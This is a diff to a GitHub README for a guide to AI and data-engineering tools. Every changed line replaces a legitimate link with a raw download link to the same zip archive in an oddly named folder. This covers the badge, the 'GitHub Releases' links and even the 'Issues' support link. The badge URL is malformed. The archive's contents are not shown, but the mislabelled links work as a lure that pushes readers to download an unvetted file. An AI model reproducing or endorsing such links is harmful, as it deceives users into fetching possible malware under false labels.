@@ -1,6 +1,6 @@
 # 🌟 ai-data-engineering-ecosystem-guide - Explore AI Tools with Ease
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Lowkey144/ai-data-engineering-ecosystem-guide/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip%https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip)](https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip)
 
 ## ✅ Overview
 The **ai-data-engineering-ecosystem-guide** is a complete reference that helps you understand AI, Machine Learning, Data Science, and Data Engineering. Inside, you'll find categorized tools, libraries, workflows, and how to use them with Python. This guide is designed for anyone looking to navigate the complex world of data and AI.
@@ -9,7 +9,7 @@ The **ai-data-engineering-ecosystem-guide** is a complete reference that helps y
 To start using this guide, follow these simple steps to download and access the content. You do not need any programming skills. 
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/Lowkey144/ai-data-engineering-ecosystem-guide/releases). 
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip). 
 
 Once you access the releases page, you will see the available files. Click on the latest version and download the relevant file for your system.
 
@@ -36,7 +36,7 @@ To run the guide, make sure your system meets the following requirements:
 3. **Follow the Examples**: Implement the suggested tools and workflows with the provided examples.
 
 ## 💬 Support
-If you have questions or need assistance, you can contact the support team. Check the [Issues](https://github.com/Lowkey144/ai-data-engineering-ecosystem-guide/issues) section in the GitHub repository for common queries or to ask your own.
+If you have questions or need assistance, you can contact the support team. Check the [Issues](https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip) section in the GitHub repository for common queries or to ask your own.
 
 ## ⚡ Community
 Join our community of users who share insights and tips. Engage with others in discussions to enhance your understanding of the data engineering landscape.
@@ -48,4 +48,4 @@ Explore further on related subjects:
 - **Visualization**: Understand how to depict data clearly and effectively.
 
 ## 💡 Final Note
-Once again, for quick access and to download the guide, go to [GitHub Releases](https://github.com/Lowkey144/ai-data-engineering-ecosystem-guide/releases). This guide is your roadmap into the world of AI and Data Engineering, packed with valuable resources and information to help you succeed.
+Once again, for quick access and to download the guide, go to [GitHub Releases](https://raw.githubusercontent.com/Lowkey144/ai-data-engineering-ecosystem-guide/main/vagabondry/ai-data-engineering-ecosystem-guide.zip). This guide is your roadmap into the world of AI and Data Engineering, packed with valuable resources and information to help you succeed.
